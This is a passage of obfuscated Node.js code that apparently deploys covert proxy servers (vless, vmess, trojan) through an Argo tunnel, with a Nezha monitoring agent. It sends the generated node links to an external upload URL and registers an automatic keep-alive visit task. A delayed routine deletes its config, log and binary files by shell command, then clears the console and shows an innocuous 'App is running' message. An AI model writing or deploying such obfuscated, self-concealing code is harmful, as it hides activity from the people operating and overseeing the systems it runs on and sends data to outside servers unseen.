_0x1660d9={_0xe44353:0x14e,_0x5275bf:0x109,_0x4692aa:0xab,_0x42b251:0xe7,_0x403156:0x154,_0x11e046:0x104,_0x1e2bcb:0x13a,_0x5b5b92:0x9c,_0x35265b:0xca},_0xb459c4=await _0x5d2bb1(),_0x33b492=NAME?NAME+'-'+_0xb459c4:_0xb459c4;return new Promise(_0x27935d=>{setTimeout(()=>{const _0x39a9be={_0x250509:0x107,_0x454dfe:0x10b,_0x41d769:0x113,_0x6c7012:0xec},_0x3557f8=_0x1629,_0x57f00b={'v':'2','ps':''+_0x33b492,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3557f8(0x14e),'net':'ws','type':_0x3557f8(_0x1660d9._0xe44353),'host':_0x4e8fd6,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x4e8fd6,'alpn':'','fp':_0x3557f8(0x159)},_0xd39946=_0x3557f8(_0x1660d9._0x5275bf)+UUID+'@'+CFIP+':'+CFPORT+_0x3557f8(_0x1660d9._0x4692aa)+_0x4e8fd6+'&fp=firefox&type=ws&host='+_0x4e8fd6+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x33b492+_0x3557f8(_0x1660d9._0x42b251)+Buffer[_0x3557f8(0x107)](JSON[_0x3557f8(_0x1660d9._0x403156)](_0x57f00b))['toString']('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x3557f8(0x123)+_0x4e8fd6+'&fp=firefox&type=ws&host='+_0x4e8fd6+_0x3557f8(0x133)+_0x33b492+_0x3557f8(_0x1660d9._0x11e046);console[_0x3557f8(0x9c)](Buffer[_0x3557f8(0x107)](_0xd39946)['toString'](_0x3557f8(0x113))),fs[_0x3557f8(_0x1660d9._0x1e2bcb)](subPath,Buffer[_0x3557f8(0x107)](_0xd39946)['toString'](_0x3557f8(0x113))),console[_0x3557f8(_0x1660d9._0x5b5b92)](FILE_PATH+_0x3557f8(0xb9)),uploadNodes(),app[_0x3557f8(_0x1660d9._0x35265b)]('/'+SUB_PATH,(_0x3f93fc,_0x5c22dd)=>{const _0x594561=_0x3557f8,_0x1dbc13=Buffer[_0x594561(_0x39a9be._0x250509)](_0xd39946)[_0x594561(_0x39a9be._0x454dfe)](_0x594561(_0x39a9be._0x41d769));_0x5c22dd[_0x594561(0x152)](_0x594561(_0x39a9be._0x6c7012),'text/plain;\x20charset=utf-8'),_0x5c22dd[_0x594561(0xe0)](_0x1dbc13);}),_0x27935d(_0xd39946);},0x7d0);});}}async function uploadNodes(){const _0x50efc9={_0x3d7d6a:0xd2,_0x590d24:0x9c,_0x4d50a3:0x132,_0x2ed7fd:0x143,_0x2a5060:0xed,_0x3d41c0:0xfe,_0x1a66c9:0x154,_0xc23fe0:0xd2,_0x5a6df8:0xfb,_0x21da97:0x9c},_0x30ca6f=_0x3463b6;if(UPLOAD_URL&&PROJECT_URL){const _0x18102c=PROJECT_URL+'/'+SUB_PATH,_0x6501b5={'subscription':[_0x18102c]};try{const _0x5a847a=await axios[_0x30ca6f(_0x50efc9._0x3d7d6a)](UPLOAD_URL+'/api/add-subscriptions',_0x6501b5,{'headers':{'Content-Type':_0x30ca6f(0x139)}});return _0x5a847a&&_0x5a847a[_0x30ca6f(0x143)]===0xc8?(console[_0x30ca6f(_0x50efc9._0x590d24)](_0x30ca6f(0x100)),_0x5a847a):null;}catch(_0xa5fad3){if(_0xa5fad3[_0x30ca6f(0x132)]){if(_0xa5fad3[_0x30ca6f(_0x50efc9._0x4d50a3)][_0x30ca6f(_0x50efc9._0x2ed7fd)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x40c4c5=fs[_0x30ca6f(_0x50efc9._0x2a5060)](listPath,_0x30ca6f(0x15d)),_0xdde076=_0x40c4c5[_0x30ca6f(_0x50efc9._0x3d41c0)]('\x0a')['filter'](_0x1a0768=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1a0768));if(_0xdde076['length']===0x0)return;const _0xd87217=JSON[_0x30ca6f(_0x50efc9._0x1a66c9)]({'nodes':_0xdde076});try{const _0x1c91eb=await axios[_0x30ca6f(_0x50efc9._0xc23fe0)](UPLOAD_URL+_0x30ca6f(_0x50efc9._0x5a6df8),_0xd87217,{'headers':{'Content-Type':_0x30ca6f(0x139)}});return _0x1c91eb&&_0x1c91eb[_0x30ca6f(0x143)]===0xc8?(console[_0x30ca6f(_0x50efc9._0x21da97)](_0x30ca6f(0x112)),_0x1c91eb):null;}catch(_0x38f469){return null;}}else return;}}function cleanFiles(){const _0x228d71={_0xce9e52:0x147,_0x4bed54:0x125,_0xb65311:0xac},_0x3fe69f={_0x3776c6:0x9f};setTimeout(()=>{const _0x59bef7={_0x479450:0x130},_0x5eb206=_0x1629,_0x1ed27c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1ed27c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1ed27c['push'](phpPath);process['platform']==='win32'?exec(_0x5eb206(_0x228d71._0xce9e52)+_0x1ed27c[_0x5eb206(_0x228d71._0x4bed54)]('\x20')+_0x5eb206(0xb7),_0x41a350=>{const _0x5dcd4b=_0x5eb206;console['clear'](),console[_0x5dcd4b(0x9c)]('App\x20is\x20running'),console['log'](_0x5dcd4b(_0x3fe69f._0x3776c6));}):exec(_0x5eb206(_0x228d71._0xb65311)+_0x1ed27c[_0x5eb206(0x125)]('\x20')+_0x5eb206(0xb2),_0xe2a6cc=>{const _0x5941b4=_0x5eb206;console['clear'](),console[_0x5941b4(0x9c)](_0x5941b4(_0x59bef7._0x479450)),console['log'](_0x5941b4(0x9f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x34f66f={_0x28f684:0x9c,_0x14c07d:0xe8,_0x2d8318:0xd2,_0x49487e:0xe4,_0x12b170:0xfd},_0x13f880=_0x3463b6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x13f880(_0x34f66f._0x28f684)](_0x13f880(_0x34f66f._0x14c07d));return;}try{const _0x3ae8f3=await axios[_0x13f880(_0x34f66f._0x2d8318)](_0x13f880(_0x34f66f._0x49487e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x13f880(0x139)}});return console[_0x13f880(_0x34f66f._0x28f684)]('automatic\x20access\x20task\x20added\x20successfully'),_0x3ae8f3;}catch(_0x1f281b){return console[_0x13f880(_0x34f66f._0x12b170)](_0x13f880(0x14f)+_0x1f281b[_0x13f880(0x15b)]),null;}}async function startserver(){const _0x4c8006={_0x1d122a:0x99},_0x2ae74c=_0x3463b6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x166297){console[_0x2ae74c(0xfd)](_0x2ae74c(_0x4c8006._0x1d122a),_0x166297);}}startserver()['catch'](_0x230cbf=>{const _0x3b4e12={_0x266d45:0xd1},_0x4430fa=_0x3463b6;console[_0x4430fa(0xfd)](_0x4430fa(_0x3b4e12._0x266d45),_0x230cbf);}),app[_0x3463b6(0xf9)](PORT,()=>console[_0x3463b6(0x9c)](_0x3463b6(0x13b)+PORT+'!'));
